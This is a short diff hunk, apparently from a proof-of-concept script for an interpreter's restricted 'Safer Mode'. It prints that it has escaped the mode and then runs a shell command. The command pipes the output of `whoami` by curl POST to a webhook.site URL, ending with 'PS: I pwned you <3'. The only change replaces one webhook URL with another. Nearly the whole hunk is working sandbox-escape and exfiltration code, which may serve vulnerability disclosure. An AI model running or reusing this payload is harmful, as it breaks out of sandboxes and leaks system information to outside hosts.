@@ -75,6 +75,6 @@ SAFER {
 (Successfully escaped from Safer Mode!) success
 
 (Executing a shell command...) info
-(curl -X POST https://webhook.site/d85c8863-1530-411e-b60d-a6bccec4d040/ -d "`whoami`") osexec print
+(curl -X POST https://webhook.site/826b200a-8279-4db0-a20f-d488d572c48d -d "`whoami`") osexec print
 (PS: I pwned you <3) success
 quit
